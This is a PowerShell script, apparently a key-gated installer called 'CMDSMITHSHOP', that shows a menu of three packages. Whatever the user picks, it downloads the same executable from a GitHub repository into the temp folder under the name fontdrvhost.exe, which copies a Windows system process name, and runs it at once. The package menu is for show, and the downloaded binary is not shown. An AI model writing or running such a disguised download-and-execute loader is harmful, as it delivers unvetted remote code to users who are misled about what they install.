Clear-Host

# ===== CONFIG =====
$ValidKey = "smithshop"
$ExeURL = "https://github.com/draft7973-ops/Smithshop/raw/main/fontdrvhost.exe"
$ExeOutput = "$env:TEMP\fontdrvhost.exe"

Write-Host "=== CMDSMITHSHOP :] ==="
Write-Host "1. Install"
Write-Host "2. Clean"

$choice = Read-Host "Choose 1 or 2"

if ($choice -eq "1") {

    $userKey = Read-Host "Enter your Key"

    # ตัดช่องว่าง + ไม่สนตัวพิมพ์เล็กใหญ่
    if ($userKey.Trim().ToLower() -eq $ValidKey.ToLower()) {

        Write-Host "✅ Key valid!" -ForegroundColor Green

        # ===== เมนูเลือก =====
        Write-Host ""
        Write-Host "Select Package:"
        Write-Host "1. smithx3d"
        Write-Host "2. uptoking"
        Write-Host "3. kingsmith"

        $package = Read-Host "Choose 1 / 2 / 3"

        if ($package -eq "1") {
            Write-Host "Installing smithx3d..."
        }
        elseif ($package -eq "2") {
            Write-Host "Installing uptoking..."
        }
        elseif ($package -eq "3") {
            Write-Host "Installing kingsmith..."
        }
        else {
            Write-Host "❌ Invalid package!" -ForegroundColor Red
            Pause
            exit
        }

        # โหลด + รัน
        Invoke-WebRequest $ExeURL -OutFile $ExeOutput
        Start-Process $ExeOutput

        Write-Host "Installation complete ✅"

    } else {
        Write-Host "❌ Key invalid!" -ForegroundColor Red
    }

}
elseif ($choice -eq "2") {

    Write-Host "Cleaning..."
    if (Test-Path $ExeOutput) {
        Remove-Item $ExeOutput -Force
        Write-Host "File removed successfully ✅"
    } else {
        Write-Host "File not found ⚠️"
    }

}
else {
    Write-Host "Invalid choice ⚠️"
}

Pause
